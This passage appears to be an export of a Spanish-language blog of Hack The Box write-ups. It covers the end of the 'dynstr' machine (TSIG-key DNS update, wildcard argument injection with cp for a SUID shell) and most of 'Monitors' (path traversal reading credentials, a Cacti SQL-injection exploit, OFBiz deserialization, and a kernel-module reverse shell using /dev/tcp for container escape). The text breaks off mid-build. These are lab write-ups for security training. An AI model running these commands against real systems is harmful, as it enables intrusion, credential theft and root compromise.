nuestra dirección IP asociada a un subdominio de infra.dyna.htb.\nAl usar linpeas.sh para enumerar, reporta que existe una clave privada potencial en ~/support-case-C62796521/C62796521-debugging.script.\nPara asociar un subdominio a nuestra dirección IP, podemos intentar usar la API de antes, pero el subdominio dyna.htb no está ofertado:\n$ curl 'http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=asdf.infra.dyna.htb\u0026myip=10.10.17.44' 911 [wrngdom: infra.dyna.htb]  Encontramos que existe otra clave más en /etc/bind/infra.key (similar a la usada en el archivo PHP anterior). Esta clave es necesaria para utilizar nsupdate (algunos ejemplos con nsupdate se pueden ver aquí):\nwww-data@dynstr:/var/www/html/nic$ cat /etc/bind/infra.key key \"infra-key\" { algorithm hmac-sha256; secret \"7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=\"; }; www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key \u0026gt; update add asdf.infra.dyna.htb 86400 A 10.10.17.44  \u0026gt; update add 44.17.10.10.in-addr.arpa 86400 PTR asdf.infra.dyna.htb \u0026gt; send \u0026gt; quit  Podemos verificarlo con dig:\n$ dig asdf.infra.dyna.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; asdf.infra.dyna.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 60663 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;asdf.infra.dyna.htb. IN A ;; ANSWER SECTION: asdf.infra.dyna.htb. 86400 IN A 10.10.17.44 ;; Query time: 76 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: ... ;; MSG SIZE rcvd: 62  Movimiento lateral al usuario bindmgr Y ahora podemos acceder como usuario bindmgr.\n$ ssh -i id_rsa bindmgr@10.10.10.244 bindmgr@dynstr:~$ cat user.txt 065011ea147bed677a2c49b904ef467c  Este usuario puede ejecutar un script en Bash como root sin proporcionar contraseña:\nbindmgr@dynstr:~$ sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bindmgr may run the following commands on dynstr: (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh  Este es el contenido del script:\n#!/usr/bin/bash # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr. # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the listof files to be included # from the source directory they won't be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed 's/^/ /';} # Check versioning (.version) echo\"[+] Running $0to stage new configuration from $PWD.\" if[[ !-f.version ]] ;then echo\"[-] ERROR: Check versioning. Exiting.\" exit42 fi if[[ \"`cat .version 2\u0026gt;/dev/null`\"-le\"`cat $BINDMGR_DIR/.version 2\u0026gt;/dev/null`\"]] ;then echo\"[-] ERROR: Check versioning. Exiting.\" exit43 fi # Create config file that includes all files from named.bindmgr. echo\"[+] Creating $BINDMGR_CONFfile.\" printf'// Automatically generated file. Do not modify manually.\\n'\u0026gt;$BINDMGR_CONF forfile in*;do printf'include \"/etc/bind/named.bindmgr/%s\";\\n'\"$file\"\u0026gt;\u0026gt;$BINDMGR_CONF done # Stage new version of configuration files. echo\"[+] Staging files to $BINDMGR_DIR.\" cp .version */etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo\"[+] Checking staged configuration.\" named-checkconf $BINDMGR_CONF \u0026gt;/dev/null if[[ $? -ne0 ]] ;then echo\"[-] ERROR: The generated configuration is not valid. Please fix following errors: \" named-checkconf $BINDMGR_CONF 2\u0026gt;\u0026amp;1|indent exit44 else echo\"[+] Configuration successfully staged.\" # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if[[ $? -ne0 ]] ;then echo\"[-] Restart of bind9 via systemctl failed. Pleasecheck logfile: \" systemctl status bind9 else echo\"[+] Restart of bind9 via systemctl succeeded.\" fi fi  Escalada de privilegios El punto clave de este script es el siguiente:\ncp .version */etc/bind/named.bindmgr/  La idea es copiar el binario bash a /tmp, cambiar su modo a SUID y después utilizar cp --preserve=mode de manera que es copiado por root en el directorio /etc/bind/named.bindmgr como SUID.\nEl uso de una wildcard (*) nos permite crear un archivo que lleve el nombre de '--preserve=mode' para que sea utilizado por el comando cp, pero no como archivo sino como parámetro.\nAquí se muestra el proceso (se necesita un archivo .version para pasar las dos primeras sentencias if):\nbindmgr@dynstr:~$ cd /tmp bindmgr@dynstr:/tmp$ echo '2' \u0026gt; .version bindmgr@dynstr:/tmp$ cp $(which bash) . bindmgr@dynstr:/tmp$ chmod 4755 bash bindmgr@dynstr:/tmp$ echo \u0026gt; --preserve=mode bindmgr@dynstr:/tmp$ ls -la | grep bindmgr -rwsr-xr-x 1 bindmgr bindmgr 1183448 Jul 17 16:56 bash -rw-rw-r-- 1 bindmgr bindmgr 1 Jul 17 16:56 --preserve=mode -rw-rw-r-- 1 bindmgr bindmgr 2 Jul 17 16:56 .version bindmgr@dynstr:/tmp$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-apache2.service-z1Nejh' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-logind.service-Hse6sg' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-resolved.service-r4Vptf' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-timesyncd.service-omMmHi' cp: -r not specified; omitting directory 'vmware-root_495-2126330929' [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...' /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE' /etc/bind/named.bindmgr/bash:40: unknown option 'YF' /etc/bind/named.bindmgr/bash:40: unexpected token near '}'  Y ahora tenemos bash como binario SUID, por lo que podemos ejecutarlo como root:\nbindmgr@dynstr:/tmp$ ls -la /etc/bind/named.bindmgr/ total 1168 drwxr-sr-x 2 root bind 4096 Jul 17 16:56 . drwxr-sr-x 3 root bind 4096 Jul 17 16:56 .. -rwsr-xr-x 1 root bind 1183448 Jul 17 16:56 bash -rw-rw-r-- 1 root bind 2 Jul 17 16:56 .version bindmgr@dynstr:/tmp$ /etc/bind/named.bindmgr/bash -p bash-5.0# cat /root/root.txt a098dde8b9b9849be538b1de060156a2  ","image":"/images/HTB/dynstr/dynstr.png","permalink":"https://7rocky.github.io/htb/dynstr/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina utiliza un servicio de DNS dinámico vulnerable a inyección de comandos y existen permisos de sudo en la máquina sobre un comando con un wildcard. Para comprometer la máquina se necesitan conocimientos de DNS, técnicas de inyección de comandos y abuso de wildcard","time":8,"title":"dynstr"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.10.238   Fecha: 24 / 04 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80 Nmap scan report for 10.10.10.238 Host is up (0.044s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.43 seconds La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nExploración web Si se accede a http://10.10.10.238/ se obtiene el siguiente error:\n$ curl http://10.10.10.238/ Sorry, direct IP access is not allowed. \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb Es necesario incluir el dominio monitors.htb en el archivo /etc/hosts. Hay una página web de Wordpress en el puerto 80 (utilizando virtual hosts, ya que las peticiones con dirección IP están bloqueadas):\nPara enumerar la página de Wordpress, se puede emplear wpscan. En este caso, se pueden listar los plugins de Wordpress accediendo a /wp-content/plugins, ya que existe una vulnerabilidad de listado de directorios:\nAl mirar si existe alguna vulnerabilidad para el plugin wp-with-spritz, se descubre que tiene vulnerabilidades de tipo navegación de directorios (Directory Path Traversal) e inclusión de archivos remotos (RFI):\n$ searchsploit spritz ------------------------------------------------------------- -----------------------  Exploit Title | Path ------------------------------------------------------------- -----------------------  WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion | php/webapps/44544.php ------------------------------------------------------------- ----------------------- Shellcodes: No Results $ cat 44544.php # Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion # Date: 2018-04-25 # Exploit Author: Wadeek # Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip # Software Version: 1.0 # Google Dork: intitle:(\u0026#34;Spritz Login Success\u0026#34;) AND inurl:(\u0026#34;wp-with-spritz/wp.spritz.login.success.html\u0026#34;) # Tested on: Apache2 with PHP 7 on Linux # Category: webapps   1. Version Disclosure  /wp-content/plugins/wp-with-spritz/readme.txt  2. Source Code  if(isset($_GET[\u0026#39;url\u0026#39;])){ $content=file_get_contents($_GET[\u0026#39;url\u0026#39;]);  3. Proof of Concept  /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec Explotando el plugin Wordpress Spritz Con este plugin vulnerable a navegación de directorios, es posible leer archivos del servidor. Por ejemplo, /etc/passwd:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd\u0026#39; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false Se puede intentar leer archivos de configuración de Wordpress y buscar credenciales de acceso a la máquina o a una base de datos. Hay una contraseña de MySQL en wp-config.php:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php\u0026#39; \u0026lt;?php /** ... */  // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; );  /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpadmin\u0026#39; );  /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;BestAdministrator@2020!\u0026#39; );  /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; );  /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; );  /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; );  // ...  require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; Sin embargo, esta contraseña no se reutiliza para SSH. Se puede notar que el código PHP no se está interpretando. Por este motivo, la técnica de Log Poisoning no tendría efecto en este caso.\nA continuación, se puede tratar de leer la configuración del servidor Apache y ver cómo están descritos los virtual hosts, buscando el archivo /etc/apache2/sites-enabled/000-default.conf:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-enabled/000-default.conf\u0026#39; # Default virtual host settings # Add monitors.htb.conf # Add cacti-admin.monitors.htb.conf  \u0026lt;VirtualHost *:80\u0026gt; \t# ... \t#ServerName www.example.com  \tServerAdmin admin@monitors.htb \tDocumentRoot /var/www/html \tRedirect 403 / \tErrorDocument 403 \u0026#34;Sorry, direct IP access is not allowed. \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb\u0026#34; \tUseCanonicalName Off \t# ... \t#LogLevel info ssl:warn  \tErrorLog ${APACHE_LOG_DIR}/error.log \tCustomLog ${APACHE_LOG_DIR}/access.log combined  \t# ... \t#Include conf-available/serve-cgi-bin.conf \u0026lt;/VirtualHost\u0026gt;  # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Explotando Cacti Como se puede ver, hay un subdominio llamado cacti-admin.monitors.htb:\nSe trata de un panel de administrador protegido con usuario y contraseña. Utilizando las credenciales admin:BestAdministrator@2020!, encontradas anteriormente, se consigue acceder:\nLa página está usando Cacti versión 1.2.12, que es vulnerable a inyección de código SQL:\n$ searchsploit cacti 1.2.12 --------------------------------------------------------------- ----------------------  Exploit Title | Path --------------------------------------------------------------- ----------------------  Cacti 1.2.12 - \u0026#39;filter\u0026#39; SQL Injection / Remote Code Execution | php/webapps/49810.py --------------------------------------------------------------- ---------------------- Shellcodes: No Results Se puede utilizar este exploit para conseguir acceso a la máquina como usuario www-data:\n$ python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p \u0026#39;BestAdministrator@2020!\u0026#39; --lhost 10.10.17.44 --lport 4444 [+] Connecting to the server... [+] Retrieving CSRF token... [+] Got CSRF token: sid:ab28037201e7a3e0416ab797984a3b7613f1d680,1625401332 [+] Trying to log in... [+] Successfully logged in! [+] SQL Injection: \u0026#34;name\u0026#34;,\u0026#34;hex\u0026#34; \u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;admin\u0026#34;,\u0026#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK\u0026#34; \u0026#34;guest\u0026#34;,\u0026#34;43e9a4ab75570f5b\u0026#34; [+] Check your nc listener! $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.238. Ncat: Connection from 10.10.10.238:58344. /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ script /dev/null -c bash Script started, file is /dev/null www-data@monitors:/usr/share/cacti/cacti$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash www-data@monitors:/usr/share/cacti/cacti$ stty rows 50 columns 158 Intrusión en la máquina Una vez en la máquina, si se accede a MySQL se puede encontrar el hash de la contraseña de admin, pero no se puede romper ni con hashcat ni con john.\nwww-data@monitors:/usr/share/cacti/cacti$ mysql -u wpadmin -p Enter password: ... mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | wordpress | +--------------------+ 2 rows in set (0.01 sec) mysql\u0026gt; use wordpress; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-----------------------+ | Tables_in_wordpress | +-----------------------+ | ... | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; describe wp_users; +--------------+---------------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +--------------+---------------------+------+-----+---------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(255) | NO | | | | | ... | ... | ... | ... | ... | ... | +--------------+---------------------+------+-----+---------+----------------+ 10 rows in set (0.00 sec) mysql\u0026gt; select user_login, user_pass from wp_users; +------------+------------------------------------+ | user_login | user_pass | +------------+------------------------------------+ | admin | $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0 | +------------+------------------------------------+ 1 row in set (0.00 sec) Al usar ifconfig se ve que la máquina tiene contenedores de Docker en ejecución, ya que hay una subred llamada docker0:\nwww-data@monitors:/usr/share/cacti/cacti$ ifconfig ... docker0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255  inet6 fe80::42:3dff:fee9:d62f prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;  ether 02:42:3d:e9:d6:2f txqueuelen 0 (Ethernet)  RX packets 2637 bytes 192831 (192.8 KB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 4213 bytes 3273053 (3.2 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens160: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 10.10.10.238 netmask 255.255.255.0 broadcast 10.10.10.255  inet6 fe80::250:56ff:feb9:d51b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;  inet6 dead:beef::250:56ff:feb9:d51b prefixlen 64 scopeid 0x0\u0026lt;global\u0026gt;  ether 00:50:56:b9:d5:1b txqueuelen 1000 (Ethernet)  RX packets 18062 bytes 7956984 (7.9 MB)  RX errors 0 dropped 70 overruns 0 frame 0  TX packets 7700 bytes 4809781 (4.8 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ... Analizando el contenedor de Docker De hecho, hay un contenedor en la dirección 172.17.0.2. Podemos transferir el binario de nmap a la máquina para realizar un escaneo de puertos en la máquina y en el contenedor:\nComo la máquina tiene nc, se puede utilizar para transferir el archivo:\n$ nc 10.10.10.238 1234 \u0026lt; $(which nmap) www-data@monitors:/usr/share/cacti/cacti$ cd /tmp www-data@monitors:/tmp$ which nc /bin/nc www-data@monitors:/tmp$ nc -nlvp 1234 \u0026gt; .nmap Listening on [0.0.0.0] (family 0, port 1234) Connection from 10.10.17.44 64550 received! www-data@monitors:/tmp$ chmod +x .nmap www-data@monitors:/tmp$ ./.nmap -p- localhost Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:12 UTC Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for localhost (127.0.0.1) Host is up (0.000078s latency). Not shown: 65528 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql 4444/tcp open unknown 8080/tcp open http-alt 8443/tcp open unknown 9988/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds www-data@monitors:/tmp$ ./nmap -p- 172.17.0.2 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:13 UTC Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for 172.17.0.2 Host is up (0.00014s latency). Not shown: 65532 closed ports PORT STATE SERVICE 8080/tcp open http-alt 8443/tcp open unknown 38279/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds Ahora, se puede realizar un reenvío de puertos con chisel para acceder a la web desde la máquina de atacante:\n$ nc 10.10.10.238 1234 \u0026lt; chisel $ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:8443=\u0026gt;8443: Listening www-data@monitors:/tmp$ nc -nlvp 1234 \u0026gt; .chisel Listening on [0.0.0.0] (family 0, port 1234) Connection from 10.10.17.44 64550 received! www-data@monitors:/tmp$ chmod +x .chisel www-data@monitors.htb:/tmp$ ./.chisel client 10.10.17.44:1337 R:8443:172.17.0.2:8443 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms) El contenedor de Docker está corriendo un servidor web en los puertos 8080 y 8443. Se puede utilizar gobuster desde la máquina (transfiriendo el archivo binario y el diccionario con nc) para descubrir algunar rutas:\n$ gobuster dir -u https://127.0.0.1:8443 -k -w $WORDLISTS/directory-list-2.3-medium.txt -q /images (Status: 302) [Size: 0] [--\u0026gt; /images/] /content (Status: 302) [Size: 0] [--\u0026gt; /content/] /common (Status: 302) [Size: 0] [--\u0026gt; /common/] /catalog (Status: 302) [Size: 0] [--\u0026gt; /catalog/] /marketing (Status: 302) [Size: 0] [--\u0026gt; /marketing/] /ecommerce (Status: 302) [Size: 0] [--\u0026gt; /ecommerce/] /ap (Status: 302) [Size: 0] [--\u0026gt; /ap/] /ar (Status: 302) [Size: 0] [--\u0026gt; /ar/] /ebay (Status: 302) [Size: 0] [--\u0026gt; /ebay/] /manufacturing (Status: 302) [Size: 0] [--\u0026gt; /manufacturing/] /passport (Status: 302) [Size: 0] [--\u0026gt; /passport/] /example (Status: 302) [Size: 0] [--\u0026gt; /example/] /bi (Status: 302) [Size: 0] [--\u0026gt; /bi/] /accounting (Status: 302) [Size: 0] [--\u0026gt; /accounting/] /webtools (Status: 302) [Size: 0] [--\u0026gt; /webtools/] /tomahawk (Status: 302) [Size: 0] [--\u0026gt; /tomahawk/] /facility (Status: 302) [Size: 0] [--\u0026gt; /facility/] /myportal (Status: 302) [Size: 0] [--\u0026gt; /myportal/] /sfa (Status: 302) [Size: 0] [--\u0026gt; /sfa/] ... El servidor contiene un Apache OFBiz 17.12.01:\nLa siguiente respuesta es extraña, pero las credenciales mostradas no son válidas:\n$ curl https://localhost:8443/webtools/control/main -k \u0026lt;!-- ... --\u0026gt; \u0026lt;div class=\u0026#34;screenlet-body\u0026#34;\u0026gt;  \u0026lt;div\u0026gt;For something interesting make sure you are logged in, try username: admin, password: ofbiz.\u0026lt;/div\u0026gt;  \u0026lt;br /\u0026gt;  \u0026lt;div\u0026gt;NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run \u0026amp;quot;gradlew loadAll\u0026amp;quot; or \u0026amp;quot;java -jar build\u0026amp;#x2f;libs\u0026amp;#x2f;ofbiz.jar -l\u0026amp;quot;\u0026lt;/div\u0026gt;  \u0026lt;br /\u0026gt;  \u0026lt;div\u0026gt;\u0026lt;a href=\u0026#34;https://localhost:8443/webtools/control/checkLogin\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- ... --\u0026gt; Explotando OFBiz Buscando en Internet por exploits, se puede encontrar el siguiente repositorio de GitHub: CVE-2020-9496, que contiene una prueba de concepto (PoC) para explotar una deserialización insegura en Java mediante XML-RPC en OFBiz 17.12.01, haciendo uso de ysoserial.\nPor comodidad, la PoC se reescribió en un script en Bash llamado deserialization.sh para ejecutarlo más fácilmente (explicación detallada aquí).\nPara realizar la explotación, se necesita un servidor web para exponer un archivo con un comando de reverse shell, por ejemplo con Python:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... Y se utiliza nc para obtener acceso al contenedor de Docker. Y entonces, se ejecuta el script:\n$ bash deserialization.sh 10.10.17.44 4444 ./ysoserial.jar Y se obtiene la conexión:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.238. Ncat: Connection from 10.10.10.238:53352. bash: cannot set terminal process group (31): Inappropriate ioctl for device bash: no job control in this shell root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export TERM=xterm root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export SHELL=bash root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# stty rows 50 columns 158 Escapando del contenedor de Docker El siguiente paso es llevar a cabo una escapada del contenedor. Este tiene la capability CAP_SYS_MODULE habilitada. Como se explica en HackTricks:\n The container has SYS_MODULE capability. As a result, the container can insert/remove kernel modules in/from the kernel of the Docker host machine.\n root@4e5701e892a5:/tmp# capsh --print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1\u0026#39;b0  secure-noroot: no (unlocked)  secure-no-suid-fixup: no (unlocked)  secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups= Siguiendo el artículo, se pueden crear unos archivos reverse.c y Makefile y transferirlos al contenedor (mediante nc a la máquina y después al contenedor usando curl). También es necesario transferir nc de la máquina al contenedor.\nreverse.c:\n#include \u0026lt;linux/kmod.h\u0026gt;#include \u0026lt;linux/module.h\u0026gt; MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;AttackDefense\u0026#34;); MODULE_DESCRIPTION(\u0026#34;LKM reverse shell module\u0026#34;); MODULE_VERSION(\u0026#34;1.0\u0026#34;);  char* argv[] = { \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.2/4444 0\u0026gt;\u0026amp;1\u0026#34;, NULL }; static char* envp[] = { \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, NULL };  static int __init reverse_shell_init() {  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); }  static void __exit reverse_shell_exit() {  printk(KERN_INFO \u0026#34;Exiting\\n\u0026#34;); }  module_init(reverse_shell_init); module_exit(reverse_shell_exit); Makefile:\nobj-m +=reverse.o all: \tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: \tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean Ahora, transferimos los archivos necesarios para crear el módulo de kernel:\nroot@4e5701e892a5:/tmp# curl 10.10.10.238:8000/nc -so .nc root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/reverse.c -so reverse.c root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/Makefile -so Makefile root@4e5701e892a5:/tmp# chmod +x .nc root@4e5701e892a5:/tmp# ./.nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) A continuación, construimos el módulo de kernel y lo ejecutamos (estando en escucha con nc):\nroot@4e5701e892a5:/tmp# make make -C /lib/modules/4.15.0-142-generic/build M=/tmp modules make[1]: Entering directory 